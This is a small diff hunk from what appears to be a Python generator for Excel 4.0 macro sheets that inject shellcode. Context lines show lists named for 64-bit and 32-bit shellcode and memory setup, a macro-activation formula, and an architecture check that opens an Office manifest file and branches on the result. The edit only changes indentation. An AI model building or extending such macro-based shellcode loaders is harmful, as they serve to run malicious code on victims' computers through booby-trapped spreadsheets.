@@ -86,7 +86,7 @@ activateMacro = ['=WORKBOOK.ACTIVATE( "Macro1")',
 osCheck = ['=ERROR(FALSE, R2C103:R3C103)', 
             r'C:\Program Files (x86)\Microsoft Office\AppXManifest.xml',
             '=FOPEN(R2C5, 2)',
-             '=IF(ISERROR(R3C5), R1C2(), R1C6())']
+            '=IF(ISERROR(R3C5), R1C2(), R1C6())']
 
 #Define columns
 cols = [[''], memory64, shellcode64, activateMacro, osCheck, memory86, shellcode86]
